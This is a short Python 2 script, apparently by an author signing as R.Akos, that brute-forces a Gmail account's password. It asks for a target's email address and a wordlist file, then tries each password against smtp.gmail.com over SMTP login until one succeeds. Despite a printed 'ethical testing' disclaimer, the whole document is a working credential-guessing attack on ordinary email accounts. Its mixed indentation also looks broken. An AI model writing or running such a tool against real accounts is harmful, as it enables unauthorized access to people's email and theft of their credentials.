import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com" , 587)
smtpserver.ehlo()
smtpserver.starttls()


print "This maded for etichal testing."
print "Pls dont be use for rude things."
print "Thank you."
print "\n" 
print "\n"
print "createdby:R.Akos"

user = raw_input("Enter the target's email address: ")
passwfile = raw_input ("Enter the password file name: ")
passwfile = open(passwfile , "r")

for password in passwfile:
        try:
                smtpserver.login(user, password)

		print "[+] Password Found:%s" %password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!]Password Incorrect:%s" %password

